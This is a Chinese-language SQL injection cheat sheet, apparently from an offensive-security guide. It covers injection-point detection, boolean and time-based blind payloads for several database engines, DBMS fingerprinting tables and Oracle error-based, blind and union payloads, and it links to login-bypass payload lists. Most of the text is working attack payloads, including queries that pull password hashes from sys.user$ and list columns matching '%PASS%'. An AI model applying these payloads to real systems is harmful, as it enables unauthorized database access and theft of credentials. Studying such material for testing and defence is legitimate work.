# SQL注入漏洞

## 1.注入点检测

（1）报错信息

特殊字符：

```bash
'
%27
"
%22
#
%23
;
%3B
)
||
*
--
/* */
&apos;
```

SQL语句：

```bash
'SELECT  //不成对的引号
1' OR '1' = '2  //逻辑错误
'1' = 1 --  //类型错误
'1' AND ASCII('a') = '97 --  //函数错误
'1' OR ('x'='x'  //操作符错误
```
(2)Boolean盲注

盲注检测：

|描述|查询语句|
|----|----|
|逻辑运算|page.php?id=1 or 1=1 -- 返回为true<br>page.php?id=1' or 1=1 -- 返回为true<br>page.php?id=1" or 1=1 -- 返回为true<br>page.php?id=1 and 1=2 -- 返回为false|
|数学运算|page.php?id=1/1 -- 返回为true<br>page.php?id=1/0 -- 返回为false<br>page.php?id=1/abs(1) -- 返回为true<br>page.php?id=1/abf(1) -- 返回为false|

逻辑运算字典：

[sql_logic](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sqli-logic.txt)

(3)时间盲注

MySQL：

```sql
1' + sleep(5)
1' and sleep(5)
1' && sleep(5)
1' | sleep(5)
```

PostgreSQL:

```sql
1' and pg_sleep(5)
1' || pg_sleep(5)
```

SQL Server:

```sql
1' WAITFOR DELAY '0:0:5'
1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (SELECT SLEEP(5)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHAR(109,97,115,116,101,114)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

Oracle:

```sql
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
1' AND DBMS_LOCK.SLEEP(5)
```

SQLite:

```sql
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## 2.DBMS识别

MySQL识别：
|描述|查询语句|
|----|----|
|睡眠|id=1'-SLEEP(1)=0 LIMIT 1 --|
|BENCHMARK|id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --|
|字符串拼接|id=' 'mysql' –<br>'my' 'sql'<br>CONCAT('my','sql')|
|函数|connection_id() --<br>row_count() --<br>POW(1,1) --|
|错误信息|id='|
|默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
|比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|

Oracle识别：
|描述|查询语句|
|----|----|
|字符串拼接|id='\|\|'oracle' --|
|函数|BITAND(1,1) –|
|默认表|id='UNION SELECT 1 FROM v$version --|
|错误信息|id='|
|睡眠|dbms_pipe.receive_message(('a'),10)|
|默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
|比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|

SQL Server识别：
|描述|查询语句|
|----|----|
|睡眠|id=';WAITFOR DELAY '00:00:10'; --|
|字符串拼接|id='mssql'+'mssql' --|
|函数|@@rowcount --<br>SQUARE(1) --<br>@@pack_received --|
|默认变量|id=sql'; SELECT @@SERVERNAME --|
|错误信息|id='<br>id=@@SERVERNAME<br>id=0/@@SERVERNAME|
|比较函数|BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)<br>@@CONNECTIONS>0<br>@@CONNECTIONS=@@CONNECTIONS|

PostgreSQL识别：
|描述|查询语句|
|----|----|
|睡眠|SELECT pg_sleep(10)|
|字符串拼接|'foo'\|\|'bar'|
|默认变量|SELECT version()|
|错误信息|1 = (select case when (条件语句) then 1/(select 0) else null end)|
|比较函数|pg_client_encoding()=pg_client_encoding()<br>get_current_ts_config()=get_current_ts_config()<br>quote_literal(42.5)=quote_literal(42.5)<br>current_database()=current_database()|

这里放置一个来自[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)的表：
```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## 3.注入类型

(1) MySQL注入



(2) Oracle

报错注入：
```sql
1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual)) -- //获取主机名
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual

1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) -- //全文检索并返回语句执行结果
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual

1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL -- //将字符串转换为XML类型
SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual
SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users

SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
```

盲注：
```sql
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10) -- //该函数用于从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
1' AND 1=DBMS_LOCK.SLEEP(10) -- //该函数用于让一个过程休眠一定的秒数，攻击者可以使用该函数来制造人为的延时
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) AND '1'=(SELECT CASE WHEN user='SYS' THEN '1' ELSE '0' END FROM dual) -- //从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
1' AND 1=(SELECT COUNT(*) FROM all_objects) -- //利用数据库中的一些操作，如查询大量的数据、进行复杂的计算等，来增加数据库的处理时间，从而影响网页的加载时间

SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) --
1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)) --
1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL --

1' AND 1=(SELECT 1/0 FROM dual) -- //利用数据库中的一些逻辑错误，如除以零、字符串转换为数字等，来触发数据库的错误信息
```

联合注入：
```sql
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT user FROM dual UNION (SELECT * FROM v$version)
SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)
```

查询语句：
```sql
查看版本
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;

查看主机名
SELECT host_name FROM v$instance; (Privileged)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;

数据库名称
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;

数据库凭据
SELECT username FROM all_users;
SELECT name, password from sys.user$;
SELECT name, spare4 from sys.user$;

列出数据库
SELECT DISTINCT owner FROM all_tables;
列：
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
表：
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

## 4.身份验证绕过

Payload:

[login_bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass.txt)<br>
[login_bypass2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass2.txt)<br>
